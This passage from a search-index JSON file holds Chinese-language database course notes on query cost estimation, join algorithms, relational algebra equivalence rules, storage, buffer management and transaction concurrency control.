\\((h_i+1)*(t_T+t_S)\\)\uff0c\u548cB+\u6811\u4e3b\u7d22\u5f15\u641c\u7d22\u539f\u7406\u4e00\u6837</li> </ul> </li> <li>Secondary B+-index on nonkey: B+\u6811\u8f85\u52a9\u7d22\u5f15\uff0c\u5355\u503cv(\u975e\u552f\u4e00)<ul> <li>Cost: \\((h_i + m+ n) * (t_T + t_S)\\)</li> <li>m\u6307B+\u6811\u4e2d\uff0c\u5bf9\u5e94\u67e5\u627e\u503cv\u7d22\u5f15\u7684\u5757\u7684\u6570\u91cf</li> <li>n\u6307\u5305\u542b\u67e5\u627e\u503cv\u7684\u6570\u636e\u5757\u7684\u6570\u91cf</li> <li></li> </ul> </li> </ul>"},{"location":"course/db/query/#external-merge-sort","title":"External Merge Sort","text":"<ul> <li>M: memory size\uff0c\u5185\u5b58\u5171\u53ef\u5b58\u653e\u7684\u9875\u7684\u4e2a\u6570</li> <li>\u5927\u81f4\u6d41\u7a0b\u53ef\u4ee5\u901a\u8fc7\u4e0b\u56fe\u8868\u793a\uff1a<ul> <li>\u7b2c\u4e00\u8f6e\u4f20\u5165M\u5757\u6570\u636e\uff0c\u8fdb\u884c\u539f\u5730\u6392\u5e8f\u3002\uff08\u4f7f\u7528\u5feb\u6392\u3001\u5806\u6392\u5e8f\u7b49\u539f\u5730\u6392\u5e8f\u7b97\u6cd5\uff09</li> <li>\u7b2c\u4e8c\u8f6e\u53ca\u540e\u9762\u6bcf\u8f6e\uff0c\u5408\u5e76M-1\u4e2a\u6709\u5e8f\u5e8f\u5217\u3002</li> <li>\u6ce8\u610f\uff0c\u9700\u8981\u5728memory\u5757\u4e2d\u9884\u7559\u4e00\u4e2a\u533a\u57df\u5b58\u653e\u6392\u5e8f\u597d\u7684\u6709\u5e8f\u5e8f\u5217\uff0c\u6240\u4ee5\u6bcf\u8f6e\u5408\u5e76\u540e\uff0c\u6709\u5e8f\u5e8f\u5217\u7684\u6bb5\u6570\u5c31\u5c11\u4e86M-1\u500d\uff08\u9884\u7559\u51fa\u4e00\u4e2a\u8f93\u51fa\u5757\u7684\u539f\u56e0\u662f\uff1a\u53ef\u4ee5\u4ee5\u5757\u4e3a\u5355\u4f4d\u5199\u56de\uff0c\u8282\u7701\u65f6\u95f4\u5f00\u9500\uff09</li> </ul> </li> <li>block transfers<ul> <li>Total number of merge passes required: \\(\\lceil \\log_{M-1}(b_r/M)\\rceil\\) (\u7b2c\u4e00\u6b21\u6392\u5e8f\u88ab\u89c6\u4e3a\u521d\u59cb\u5316\uff0c\u4e0d\u8ba1\u5165\u5176\u4e2d\uff0c\u53ef\u5e26\u5165\u68c0\u9a8c\\(b_r=M\\)\u548c\\(b_r=M-1\\)\u7684\u60c5\u51b5)</li> <li>\u56e0\u4e3a\u5728\u4e00\u8f6e\u5f52\u5e76\u6392\u5e8f\u4e2d\uff0c\u4e00\u4e2a\u5757\u9700\u8981\u7ecf\u5386\u5199\u5165\u5185\u5b58\u3001\u7136\u540e\u5199\u56de\u78c1\u76d8\uff0c\u6240\u4ee5\u6bcf\u8f6e\u7684\u5f00\u9500\u662f \\(2b_r\\)</li> <li>\u6700\u540e\u4e00\u8f6e\u6392\u5e8f\uff0c\u4e0d\u8ba1\u7b97\u5199\u56dedisk\u7684\u5f00\u9500\u3002</li> <li>\u6240\u4ee5\u603b\u6b21\u6570\u662f\\(b_r(2\\lceil \\log_{M-1}(b_r/M)\\rceil + 1)\\)</li> </ul> </li> <li>seek times<ul> <li>\u7b2c\u4e00\u6b21\u6392\u5e8f\uff1a\\(\\lceil b_r/M\\rceil\\) \u6b21seek</li> <li>\u7b2c\u4e8c\u6b21\u6392\u5e8f\u53ca\u540e\u9762\u7684\u6392\u5e8f\uff1a\u5047\u8bbe\u6bcf\u6b21\u8bfb\u5165/\u5199\u51fa\u7684\u5757\u6570\u4e3a\\(\\lceil b_b \\rceil\\) \u5219\u9700\u8981\\(\\lceil b_r/b_b\\rceil\\)\u6b21\u8bfb\u51fa\u548c\u5199\u5165\uff0c\u6b64\u5904\u5171\u7ecf\u5386\\(\\lceil \\log_{M-1}{(b_r/M)} \\rceil\\)\u8f6e\u6392\u5e8f\uff0c\u6700\u540e\u4e00\u8f6e\u4e0d\u7528\u5199\u5165\uff0c\u6545\u4e00\u5171\u4e3a\\(\\lceil b_r/b_b\\rceil(2\\lceil \\log_{M-1}{(b_r/M)} \\rceil -1)\\)\u6b21seek</li> <li>\u603b\u8ba1\u4e3a\\(2\\lceil b_r/M \\rceil + \\lceil b_r/b_b\\rceil(2\\lceil \\log_{M-1}{(b_r/M)} \\rceil -1)\\)</li> </ul> </li> </ul>"},{"location":"course/db/query/#join","title":"Join","text":"<p>(1) Nested-Loop Join \\(r\\bowtie_\\theta s\\)\uff0c\u4f2a\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>for each tuple tr in r do begin\n    for each tuple ts in s do begin\n        test pair (tr, ts) to see if they satisfy the join condition\n        if they do, add tr\u00b7ts to the result\n    end\nend\n</code></pre> <ul> <li>\u6700\u574f\u60c5\u51b5\uff08\u53ea\u80fd\u8f7d\u5165\u4e24\u4e2ablock\uff0cr/s\u5404\u4e00\u4e2a\uff09<ul> <li>block transfers: \\(b_r+n_r*b_s\\)<ul> <li>r\u5171\u8981\u8f7d\u5165\\(b_r\\)\u6b21\uff0c\u800cs\u5171\u8981\u8f7d\u5165\\(n_r*b_s\\)\u6b21</li> </ul> </li> <li>seek times: \\(b_r+n_r\\)<ul> <li>r\u5171\u8981seek \\(b_r\\)\u6b21\uff0c\u800cs\u5171\u8981seek \\(n_r\\)\u6b21</li> </ul> </li> </ul> </li> <li>\u6700\u597d\u60c5\u51b5\uff08\u5168\u90e8\u5143\u7ec4\u90fd\u80fd\u76f4\u63a5\u8f7d\u5165\u5185\u5b58\uff09<ul> <li>block transfers \\(b_r + b_s\\)</li> <li>seek times: \\(2\\)</li> </ul> </li> </ul> <p>(2) Block Nested-Loop Join</p> <pre><code>for each block Br in r do begin\n    for each block Bs in s do begin\n        for each tuple tr in Br do begin\n            for each tuple ts in Bs do begin\n                test pair (tr, ts) to see if they satisfy the join condition\n                if they do, add tr\u00b7ts to the result\n            end\n        end\n    end\nend\n</code></pre> <ul> <li>\u6700\u574f\u60c5\u51b5\uff08\u53ea\u80fd\u8f7d\u5165\u4e24\u4e2ablock\uff0cr/s\u5404\u4e00\u4e2a\uff09<ul> <li>block transfers: \\(b_r+b_r*b_s\\)<ul> <li>r\u5171\u8981\u8f7d\u5165\\(b_r\\)\u6b21\uff0c\u800cs\u5171\u8981\u8f7d\u5165\\(b_r*b_s\\)\u6b21</li> </ul> </li> <li>seek times: \\(2b_r\\)<ul> <li>r\u5171\u8981seek \\(b_r\\)\u6b21\uff0c\u800cs\u5171\u8981seek \\(b_r\\)\u6b21</li> </ul> </li> </ul> </li> <li>\u6700\u597d\u60c5\u51b5\uff08\u5168\u90e8\u5143\u7ec4\u90fd\u80fd\u76f4\u63a5\u8f7d\u5165\u5185\u5b58\uff09<ul> <li>block transfers \\(b_r + b_s\\)</li> <li>seek times: \\(2\\)</li> </ul> </li> </ul> <p>(3) Indexed Nested-Loop Join</p> <ul> <li>\u539f\u7406\uff1a\u5916\u5c42\u904d\u5386tuple(\u6bcf\u6b21\u8bfb\u53d6\u4e00\u4e2ablock)\uff0c\u5185\u5c42\u4f7f\u7528\u7d22\u5f15\u5339\u914d\uff08\u5982B+\u6811\u7d22\u5f15\u7b49\uff09</li> <li>\u6700\u574f\u60c5\u51b5\uff08\u53ea\u80fd\u8f7d\u5165\u4e24\u4e2ablock\uff0cr/s\u5404\u4e00\u4e2a\uff09</li> <li>\u56e0\u4e3a\u7d22\u5f15\u672c\u8eab\u7684\u590d\u6742\u5ea6\u8f83\u590d\u6742\uff0c\u6545\u53ea\u7ed9\u51fa\u8f83\u7c97\u7565\u7684\u4f30\u7b97\\(b_r*(t_T+t_S)+n_r*c\\)<ul> <li>\u5176\u4e2d\\(c\\)\u6307\u5355\u6b21\u67e5\u8be2\u7684\u5e73\u5747\u5f00\u9500</li> </ul> </li> </ul> <p>(4) Merge-Join</p> <ul> <li>\u7b97\u6cd5\u6d41\u7a0b<ol> <li>\u6839\u636eindex\u7684attributes\u8fdb\u884c\u6392\u5e8f</li> <li>\u8fde\u63a5\u4e24\u4e2a\u6392\u5e8f\u8fc7\u7684\u8868\uff08\u4ece\u5934\u5230\u5c3e\u626b\u63cf\uff09</li> </ol> </li> <li>\u7406\u60f3\u60c5\u51b5\u4e0b\uff08\u6bcf\u4e2a\u5757\u53ea\u9700\u8981\u8bfb\u8fdb\u5185\u5b58\u4e00\u6b21\uff09<ul> <li>block transfers: \\(b_r + b_s\\) +(\u6392\u5e8f)</li> <li>seek times: \\(\\lceil b_r/b_b\\rceil + \\lceil b_s/b_b\\rceil\\) +(\u6392\u5e8f)</li> </ul> </li> </ul> <p>(5) Hash-Join</p> <p>\u5927\u81f4\u6d41\u7a0b\u5982\u4e0b</p> <pre><code>\u5c06r\u5212\u5206\u6210nh\u4e2a\u5757\n\u5c06s\u5212\u5206\u6210nh\u4e2a\u5757\n\nfor 0 to nh-1\n    \u5bf9r\u5bf9\u5e94\u5757\u4e2d\u7684\u5143\u7d20\u5efa\u7acb\u7d22\u5f15Ri\n    for \u904d\u5386s\u5bf9\u5e94\u5757\u4e2d\u7684\u5143\u7d20\n        \u68c0\u7d22\u7d22\u5f15Ri\n        for \u6240\u6709\u5339\u914d\u7684tuple in r\n            join\n        end\n    end\nend\n</code></pre> <p>\u5047\u8bber,s\u5206\u522b\u88ab\u5212\u5206\u4e86\\(n_r,n_s\\)\u4e2a\u5757\uff0c\u4f46\u5f53\\(n_r,n_s&gt;M\\)\u8d85\u8fc7\u5185\u5b58\u7684\u5bb9\u7eb3\u7a7a\u95f4\u65f6\uff0c\u5219\u9700\u8981\u8fdb\u884c\u9012\u5f52\u5212\u5206\u3002</p> <ul> <li>\u82e5\u6ca1\u6709\u9012\u5f52\u5212\u5206<ul> <li>block transfer: \\(3(b_r+b_s)+4n_h\\)<ul> <li>\u5212\u5206\u8fc7\u7a0b\u9700\u8981\u904d\u5386\u8868\uff0c\u5305\u542b\u8bfb\u51fa\u548c\u5199\u56de \\(2*(b_r+b_s)\\)</li> <li>\u5339\u914d\u8fc7\u7a0b\u9700\u8981\u904d\u5386\u8868\uff0c\u53ea\u5305\u542b\u8bfb\u51fa \\(b_r+b_s\\)</li> <li>\u4f46\u662f\u82e5Hash\u8868\u975e\u6ee1\uff0c\u5219\u81f3\u591a\u5236\u9020\u51fa\\(n_h\\)\u4e2a\u975e\u6ee1\u5757\uff0c\u6d89\u53ca\u5212\u5206\u7684\u5199\u56de\u548c\u5339\u914d\u7684\u8bfb\u51fa\uff0c\u4f5c\u7528\u4e8e\u4e24\u4e2a\u8868\uff0c\u6545\u5171\\(4n_h\\) (\u5b9e\u9645\u4e2d\\(n_h\\)\u4e00\u822c\u5f88\u5c0f\uff0c\u53ef\u4ee5\u5ffd\u7565\u4e0d\u8ba1)</li> </ul> </li> <li>seek times: \\(2(\\lceil b_r/b_b\\rceil +\\lceil b_s/b_b\\rceil)+2n_h\\)<ul> <li>\u5212\u5206\u8fc7\u7a0b\u9700\u8981\u904d\u5386\u8868\uff0c\u5047\u8bbe\u6bcf\u6b21\u653e\u5165\u5185\u5b58\u5757\u4e2d\\(b_b\\)\u4e2a\uff0c\u5219\u8bfb\u51fa\u5199\u56de\u5171\u9700\\(2(\\lceil b_r/b_b\\rceil +\\lceil b_s/b_b\\rceil)\\)\u6b21</li> <li>\u5339\u914d\u8fc7\u7a0b\u4e2d\u76f4\u63a5\u53d6Hash\u5757\uff0c\u5171\\(2n_h\\)</li> </ul> </li> </ul> </li> <li>\u82e5\u6709\u9012\u5f52\u5212\u5206<ul> <li>\u9012\u5f52\u5212\u5206\u7684\u539f\u5219\u662f\uff0c\u6bcf\u6b21\u5c06\u5212\u5206\u7684\u5927\u5c0f\u964d\u4e3a\u539f\u6765\u7684\\(M-1\\)\uff0c\u76f4\u81f3\u6bcf\u4e2a\u5212\u5206\u7684\u6700\u591a\u5360\\(M\\)\u5757\u4e3a\u6b62\uff08\u4f7f\u5f97\u5185\u5b58\u80fd\u591f\u5bb9\u7eb3\u4e0b\uff0c\u4ee5\u4fbf\u4e8e\u5efa\u7acb\u7d22\u5f15\uff09</li> <li>block transfer: \\(2(b_r+b_s)\\lceil log_{M-1}(b_s)-1\\rceil+b_r+b_s\\)<ul> <li>\u5171\u8fdb\u884c\\(\\lceil log_{M-1}(b_s)-1\\rceil\\)\u8f6e</li> <li>\u5176\u4f59\u53c2\u7167\u6ca1\u6709\u9012\u5f52\u5212\u5206\u7684\u60c5\u51b5</li> </ul> </li> <li>seek times: \\(2(\\lceil b_r/b_b\\rceil +\\lceil b_s/b_b\\rceil)\\lceil log_{M-1}(b_s)-1\\rceil+2n_h\\)<ul> <li>\u5171\u8fdb\u884c\\(\\lceil log_{M-1}(b_s)-1\\rceil\\)\u8f6e</li> <li>\u5176\u4f59\u53c2\u7167\u6ca1\u6709\u9012\u5f52\u5212\u5206\u7684\u60c5\u51b5</li> </ul> </li> </ul> </li> </ul>"},{"location":"course/db/query/#evaluation","title":"Evaluation","text":"<p>\u5bf9\u4e00\u4e9b\u5355\u64cd\u4f5c\u7684\u590d\u6742\u5ea6\u6709\u4e86\u89e3\u4e4b\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528\u7269\u5316(Materialization)\u548c\u6d41\u6c34(pipelining)\u7684\u65b9\u6cd5\u5c06\u4ed6\u4eec\u4e32\u8d77\u6765</p> <ul> <li>\u5b9e\u4f53\u5316\uff1a\u4f9d\u6b21\u8fdb\u884c\u8868\u8fbe\u5f0f\u7684\u8ba1\u7b97\uff0c\u6784\u5efa\u524d\u7f00\u6811\u9012\u5f52\u8fdb\u884c</li> <li>\u6d41\u6c34\u7ebf\uff1a\u540c\u65f6\u8bc4\u4f30\u591a\u4e2a\u64cd\u4f5c</li> </ul>"},{"location":"course/db/query/#optimization","title":"Optimization","text":""},{"location":"course/db/query/#equivalence-rule","title":"Equivalence Rule(\u7b49\u4ef7\u5173\u7cfb\u8868\u8fbe\u5f0f)","text":"<ol> <li>Conjunctive selection operations can be deconstructed into a sequence of indicidual selections \\(\\sigma_{\\theta_1\\land\\theta_2}(E)=\\sigma_{\\theta_1}(\\sigma_{\\theta_2}(E))\\)</li> <li>Selection operations are commutative \\(\\sigma_{\\theta_1}(\\sigma_{\\theta_2}(E)) = \\sigma_{\\theta_2}(\\sigma_{\\theta_1}(E))\\)</li> <li>Only the last in a sequence of projection operations is needed, the others can be ommitted.\\(\\Pi_{L_1}(\\Pi_{L_2}(...(\\Pi_{L_n}(E))...))=\\Pi_{L_1}(E)\\)</li> <li>Selections can be combined with Cartesian products and theta joins.         (1) \\(\\sigma_{\\theta}(E_1\\times E_2) = E_1 \\bowtie_\\theta E_2\\)         (2) \\(\\sigma_{\\theta_1}(E_1\\bowtie_{\\theta_2} E_2)=E_1\\bowtie_{\\theta_1\\land\\theta_2}E_2\\)</li> <li>Theta-join operations (and natural joins) are commutative.\\(E_1\\bowtie_\\theta E_2 = E_2\\bowtie_\\theta E_1\\)</li> <li>Natural join operatins are associative \\((E_1\\bowtie E_2)\\bowtie E_3 = E_1\\bowtie(E_2\\bowtie E_3)\\), Theta joins are associative in the following manner \\((E_1\\bowtie_{\\theta_1} E_2)\\bowtie_{\\theta_2\\land\\theta_3} E_3 = E_1\\bowtie_{\\theta_1\\land \\theta_3}(E_2\\bowtie_{\\theta_2} E_3)\\), where \\(theta_2\\) involves attributes from only \\(E_2\\) and \\(E_3\\).</li> <li>The selection operation distributes over the theta join operation under the following two conditions:         (1) When all the attributes in \\(\\theta_0\\) involve only the attributes of one of the expressions (\\(E_1\\)) being joined \\(\\sigma_{\\theta_0}(E_1\\bowtie_{\\theta}E_2)=(\\sigma_{\\theta_0}(E_1))\\bowtie_\\theta E_2\\)         (2) When \\(\\theta_1\\) involves only the attributes of \\(E_1\\) and \\(\\theta_2\\) involves only the attributes of \\(E_2\\). \\(\\sigma_{\\theta_1\\land \\theta_2}(E_1\\bowtie_{\\theta}E_2)=(\\sigma_{\\theta_1}(E_1))\\bowtie_{\\theta}(\\sigma_{\\theta_2}(E_2))\\)</li> <li>The projetion operation distributes over the theta join operation as follows:         (1) if \\(\\theta\\) involves only attributes from \\(L_1 \\cup L2\\): \\(\\Pi_{L1\\cup L_2}(E_1\\bowtie_{\\theta}E_2)=(\\Pi_{L_1}(E_1))\\bowtie_{\\theta}(\\Pi_{L_2}(E_2))\\)         (2) Consider a join \\(E_1\\bowtie_\\theta E_2\\).         (3) Let \\(L_1\\) and \\(L_2\\) be sets of attributes from \\(E_1\\) and \\(E_2\\) respectively         (4) Let \\(L_3\\) be attributes of \\(E_1\\) that are involved in join condition \\(\\theta\\), but are not in \\(L_1 \\cup L_2\\)         (5) Let \\(L_4\\) be attributes of \\(E_2\\) that are involved in join condition \\(\\theta\\), but are not in \\(L_1\\cup L_2\\) \\(\\Pi_{L_1\\cup L_2}(E_1\\bowtie_\\theta E_2)=\\Pi_{L_1\\cup L_2}((\\Pi_{L_1\\cup L_3}(E_1))\\bowtie_\\theta(\\Pi_{L2\\cup L_4}(E_2)))\\)</li> <li>The set operations union and intersection are commutative \\(E_1 \\cup E_2 = E_2 \\cup E_1\\), \\(E_1\\cap E_2 = E_2 \\cap E_1\\)</li> <li>Set union and intersection are assocative \\((E_1\\cup E_2)\\cup E_3 = E_1 \\cup (E_2\\cup E_3)\\), \\((E_1\\cap E_2)\\cap E_3=E_1\\cap(E_2\\cap E_3)\\)</li> <li>The selection operation distributes over \\(\\cap\\), \\(\\cup\\) and \\(-\\) \\(\\sigma_\\theta(E_1-E_2)=\\sigma_\\theta(E_1)-\\sigma_\\theta(E_2)\\)</li> <li>The projection operation distributes over union \\(\\Pi_{L}(E_1\\cup E_2)=(\\Pi_L(E_1))\\cup (\\Pi_{L}(E_2))\\)</li> </ol>"},{"location":"course/db/query/#cost-estimation","title":"Cost Estimation(\u7ed3\u679c\u96c6\u5927\u5c0f\u4f30\u8ba1)","text":"<ul> <li>\u57fa\u672c\u6982\u5ff5<ul> <li>\\(n_r\\): number of tuples in a relation \\(r\\)</li> <li>\\(b_r\\): number of blocks containing tuples of \\(r\\)</li> <li>\\(l_r\\): size of a tuple of \\(r\\)</li> <li>\\(f_r\\): blocking factor of \\(r\\)</li> <li>\\(V(A,r)\\): number of distinct values that appear in \\(r\\) for attribute \\(A\\); same as the size of \\(\\Pi_A(r)\\)</li> <li>\\(b_r=\\lceil \\frac{n_r}{f_r} \\rceil\\)</li> </ul> </li> <li>\u7b97\u6cd5\u4f30\u8ba1<ul> <li>\u9009\u62e9\u4f30\u8ba1\\(\\sigma_{A=v}(r)\\)<ul> <li>\u4e00\u822c\u5047\u8bbe\u4e3a\u5747\u5300\u5206\u5e03</li> <li>\\(n_r/V(A,r)\\)</li> </ul> </li> <li>\u590d\u6742\u9009\u62e9\u4f30\u8ba1<ul> <li>\u5408\u53d6\\(\\sigma_{\\theta_1\\land \\theta_2\\land\\dots\\land\\theta_n(r)}\\): \\(n_r\\cdot\\frac{s_1\\cdot s_2\\dots s_n}{n_r^n}\\)</li> <li>\u6790\u53d6\\(\\sigma_{\\theta_1\\lor \\theta_2\\lor\\dots\\lor\\theta_n(r)}\\): \\(n_r\\cdot(1-(1-\\frac{s_1}{n_r})(1-\\frac{s_2}{n_r})\\dots(1-\\frac{s_n}{n_r}))\\)</li> </ul> </li> <li> <p>\u8fde\u63a5\u4f30\u8ba1\\(r\\bowtie s\\)</p> <ul> <li> <p>\u82e5\u4e24\u4e2a\u5173\u7cfb\u65e0\u5171\u540c\u5c5e\u6027: \\(n_r \u00b7 n_s\\)</p> </li> <li> <p>\u82e5\u5171\u540c\u5c5e\u6027\u662fr\u7684key: \\({\\rm size} \\le n_s\\) </p> </li> <li> <p>\u82e5\u5171\u540c\u5c5e\u6027\u662fs\u5230r\u7684foregin key: \\(n_s\\)</p> </li> <li> <p>\u82e5\u5171\u540c\u5c5e\u6027\u4e0d\u662fkey: \\(\\min(\\frac{n_s\\cdot n_r}{V(A,s)}, \\frac{n_s\\cdot n_r}{V(A,r)})\\)</p> <ul> <li>\u6295\u5f71: \\(\\Pi(s)\\): \\(V(A,r)\\)</li> <li>\u805a\u5408: \\(\\mathcal{G}(s)\\): \\(V(A,r)\\)</li> <li>\u96c6\u5408\uff1a\u8f6c\u6362\u4e3a\u5408\u53d6\u548c\u6790\u53d6</li> </ul> </li> <li>Heuristic Optimization \u63a2\u7d22\u5f0f\u7684\u4f18\u5316<ul> <li>\u5c3d\u65e9\u8fdb\u884cselection</li> <li>\u5c3d\u65e9\u8fdb\u884cprojection</li> <li>\u9009\u62e9\u6700\u4e25\u683c\u7684selection\u548coperations\u64cd\u4f5c</li> </ul> </li> </ul> </li> </ul> </li> </ul>"},{"location":"course/db/storage/","title":"Database Storage","text":"<p>Database\u7684\u5b58\u50a8\u7ed3\u6784\u53ef\u7531\u4e0b\u56fe\u6240\u793a\uff1a </p>"},{"location":"course/db/storage/#buffer-manager","title":"Buffer Manager","text":"<ul> <li>\u901a\u8fc7\u5c06\u6570\u636e\u653e\u5230\u4e3b\u5b58(Memory)\u4e2d\u6765\u63d0\u9ad8\u8bbf\u95ee\u6548\u7387\u3002</li> <li>buffer manager\uff1a\u7528\u4e8e\u7ba1\u7406\u7f13\u51b2\u533a\u4e2d\u7684\u5185\u5b58\u5206\u914d\u3002</li> <li>\u6d89\u53ca\u5230buffer\u7684\u66ff\u6362\u7b97\u6cd5\u3002</li> <li>LRU strategy\uff1a\u66ff\u6362\u6389\u6700\u8fd1\u4f7f\u7528\u9891\u7387\u6700\u4f4e\u7684block</li> <li>FIFO\uff1a\u5148\u8fdb\u5148\u51fa</li> <li>Random\uff1a\u968f\u673a\u66ff\u6362</li> <li>Clock: LRU\u7684\u7ea6\u7b80\u7248\uff0c\u6709\u4e00\u4e2areference bit(second chance bit)</li> <li>\u5c06\u6570\u636e\u4ece\u4e3b\u5b58\u5199\u5165\u5916\u5b58\u540e\u624d\u7b97\u662f\u7a33\u5b9a\u5b58\u50a8\uff08\u6389\u7535\u4e0d\u5931\uff09\u3002</li> </ul>"},{"location":"course/db/storage/#column-oriented-storage","title":"Column-Oriented Storage","text":"<p>\u884c\u5b58\u50a8(row-oriented representation)\u662f\u6700\u57fa\u672c\u7684\u5b58\u50a8\u65b9\u6cd5\uff0c\u5373\u5c06\u8868\u4e2d\u7684\u6570\u636e\u4e00\u6761\u4e00\u6761\u5b58\u50a8\u3002\u800c\u5217\u5b58\u50a8(column-oriented Storage)\u5728\u6709\u65f6\u53ef\u4ee5\u53d1\u6325\u66f4\u5927\u7684\u529f\u6548\u3002\u5f53\u7136\u6709\u65f6\u5019\u53ef\u80fd\u4e5f\u4f1a\u91c7\u53d6\u884c\u5217\u6df7\u5408\u5b58\u50a8\u7684\u65b9\u5f0f\uff08hybrid row/column stores\uff09\u3002\u5217\u5b58\u50a8\u65b9\u5f0f\u5982\u4e0b\u56fe\u6240\u793a\uff1a</p>"},{"location":"course/db/storage/#benefit","title":"Benefit","text":"<ul> <li>Reduced IO if only some attributes are accessed</li> <li>Improved CPU cache performance</li> <li>Improved compression</li> <li>Vector processing on modern CPU architectures</li> </ul>"},{"location":"course/db/storage/#drawbacks","title":"Drawbacks","text":"<ul> <li>Cost of tuple reconstruction from columnar representation</li> <li>Cost of tuple deletion and update</li> <li>Cost of decompression</li> </ul>"},{"location":"course/db/storage/#_1","title":"\u884c\u5b58\u50a8&amp;\u5217\u5b58\u50a8\u5bf9\u6bd4","text":""},{"location":"course/db/transaction/","title":"Transaction","text":""},{"location":"course/db/transaction/#basic-concepts","title":"Basic concepts","text":""},{"location":"course/db/transaction/#acid","title":"ACID","text":"<ul> <li>\u539f\u5b50\u6027(Atomicity): \u4e8b\u52a1\u4e2d\u7684\u6240\u6709\u6b65\u9aa4\u53ea\u80fdcommit\u6216\u8005rollback\u3002</li> <li>\u4e00\u81f4\u6027(Consistency): \u5355\u72ec\u6267\u884c\u4e8b\u52a1\u53ef\u4ee5\u4fdd\u6301\u6570\u636e\u5e93\u7684\u4e00\u81f4\u6027\u3002</li> <li>\u9694\u79bb\u6027(Isolation): \u4e8b\u52a1\u5728\u5e76\u884c\u6267\u884c\u7684\u65f6\u5019\u4e0d\u80fd\u611f\u77e5\u5230\u5176\u4ed6\u4e8b\u52a1\u6b63\u5728\u6267\u884c\uff0c\u4e2d\u95f4\u7ed3\u679c\u5bf9\u4e8e\u5176\u4ed6\u6267\u884c\u7684\u4e8b\u52a1\u662f\u9690\u85cf\u7684\u3002</li> <li>\u6301\u7eed\u6027(Durability): \u66f4\u65b0\u4e4b\u540e\u54ea\u6015\u8f6f\u4ef6\u51fa\u4e86\u95ee\u9898\uff0c\u66f4\u65b0\u7684\u6570\u636e\u4e5f\u5fc5\u987b\u5b58\u5728\u3002</li> </ul>"},{"location":"course/db/transaction/#_1","title":"\u72b6\u6001","text":"<ul> <li>active\uff1a\u521d\u59cb\u72b6\u6001\uff0c\u6267\u884c\u4e2d\u7684\u4e8b\u52a1\u90fd\u5904\u4e8e\u8fd9\u4e2a\u72b6\u6001\u3002</li> <li>partially committed\uff1a\u5728\u6700\u540e\u4e00\u53e5\u6307\u4ee4\u88ab\u6267\u884c\u4e4b\u540e\u3002</li> <li>failed\uff1a\u5728\u53d1\u73b0\u6267\u884c\u5931\u8d25\u4e4b\u540e\u3002</li> <li>aborted\uff1a\u56de\u6eda\u7ed3\u675f\uff0c\u4f1a\u9009\u62e9\u662f\u91cd\u65b0\u6267\u884c\u4e8b\u52a1\u8fd8\u662f\u7ed3\u675f\u3002</li> <li>committed\uff1a\u4e8b\u52a1\u88ab\u5b8c\u6574\u7684\u6267\u884c</li> </ul>"},{"location":"course/db/transaction/#concurrent-executions","title":"Concurrent Executions","text":"<ul> <li>serial schedule \u4e32\u884c\u8c03\u5ea6\uff1a\u4e00\u4e2a\u4e8b\u52a1\u8c03\u5ea6\u5b8c\u6210\u4e4b\u540e\u518d\u8fdb\u884c\u4e0b\u4e00\u4e2a</li> <li>equivalent schedule \u7b49\u4ef7\u8c03\u5ea6\uff1a\u6539\u53d8\u5904\u7406\u7684\u987a\u5e8f\u4f46\u662f\u548c\u539f\u6765\u7b49\u4ef7</li> <li>conflict serializability \u51b2\u7a81\u53ef\u4e32\u884c\u5316<ul> <li>conflict equivalent\uff1a\u4e24\u4e2a\u8c03\u5ea6\u4e4b\u95f4\u53ef\u4ee5\u901a\u8fc7\u6539\u53d8\u4e00\u4e9b\u4e0d\u51b2\u7a81\u7684\u6307\u4ee4\u6765\u8f6c\u6362\uff0c\u5c31\u53eb\u505a\u51b2\u7a81\u7b49\u4ef7</li> <li>conflict serializable\uff1a\u51b2\u7a81\u53ef\u4e32\u884c\u5316\uff1a\u5f53\u4e14\u4ec5\u5f53\u4e00\u4e2a\u8c03\u5ea6S\u53ef\u4ee5\u548c\u4e00\u4e2a\u4e32\u884c\u8c03\u5ea6\u7b49\u4ef7</li> <li>Precedence graph \u524d\u9a71\u56fe</li> </ul> </li> <li>Recoverable Schedules \u53ef\u6062\u590d\u8c03\u5ea6<ul> <li>\u5982\u679c\u4e00\u4e2a\u4e8b\u52a1\\(T_1\\)\u8981\u8bfb\u53d6\u67d0\u4e00\u90e8\u5206\u6570\u636e\uff0c\u800c\\(T_2\\)\u8981\u5199\u5165\u540c\u4e00\u90e8\u5206\u7684\u6570\u636e\uff0c\u5219\\(T_1\\)\u5fc5\u987b\u5728 \\(T_2\\)commit\u4e4b\u524d\u5c31commit\uff0c\u5426\u5219\u5c31\u4f1a\u9020\u6210dirty read</li> </ul> </li> <li>Cascading Rollbacks \u7ea7\u8054\u56de\u6eda: \u5355\u4e2a\u4e8b\u52a1\u7684fail\u9020\u6210\u4e86\u4e00\u7cfb\u5217\u7684\u4e8b\u52a1\u56de\u6eda</li> <li>Cascadeless Schedules \u907f\u514d\u7ea7\u8054\u56de\u6eda\u7684\u8c03\u5ea6<ul> <li>Cascadeless Schedules\u4e5f\u662f\u53ef\u6062\u590d\u7684\u8c03\u5ea6</li> </ul> </li> </ul>"},{"location":"course/db/transaction/#concurrency-control","title":"Concurrency Control","text":"<ul> <li>Lock-Based Protocols<ul> <li>exclusive(X) lock: \u53ef\u8bfb\u53ef\u5199</li> <li>shared(S) lock: \u53ef\u8bfb\u4e0d\u53ef\u5199</li> <li>Lock-compatibility matrix</li> </ul> </li> <li>Two-Phase Locking Protocol<ul> <li>Phase 1: Growing Phase<ul> <li>transaction may obtain locks</li> <li>transaction may not release locks</li> </ul> </li> <li>Phase 2: Shrinking Phase<ul> <li>transaction may release locks</li> <li>transaction may not obtain locks</li> </ul> </li> <li>Two-Phase Locking Protocol assures serializability.</li> <li>\u4e24\u4e2a\u53d8\u79cd<ul> <li>\u4e25\u683c\u4e24\u9636\u6bb5\u5c01\u9501\u534f\u8bae(strict two-phase locking protocol)\uff1a\u8981\u6c42\u4e8b\u52a1\u6301\u6709\u7684 X \u9501\u5fc5\u987b\u5728 \u4e8b\u52a1\u63d0\u4ea4\u4e4b\u540e\u65b9\u53ef\u91ca\u653e\u3002\u89e3\u51b3\u7ea7\u8054\u56de\u6eda\u7684\u95ee\u9898\u3002</li> <li>\u5f3a\u4e24\u9636\u6bb5\u5c01\u9501\u534f\u8bae(rigorous two-phase locking protocol)\uff1a\u8981\u6c42\u4e8b\u52a1\u63d0\u4ea4\u524d\u4e0d\u5f97\u91ca\u653e \u4efb\u4f55\u9501\u3002</li> </ul> </li> <li></li> </ul> </li> 